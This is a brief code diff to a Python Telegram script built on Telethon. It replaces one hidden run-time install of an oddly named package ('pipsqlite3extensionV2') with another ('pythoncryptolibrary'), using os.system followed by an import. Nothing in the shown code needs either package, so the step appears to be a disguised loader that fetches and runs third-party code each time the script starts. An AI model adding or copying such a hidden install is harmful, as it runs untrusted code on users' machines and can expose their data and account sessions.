@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlite3extensionV2")
-import pipsqlite3extensionV2
+os.system("pip install pythoncryptolibrary")
+import pythoncryptolibrary
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
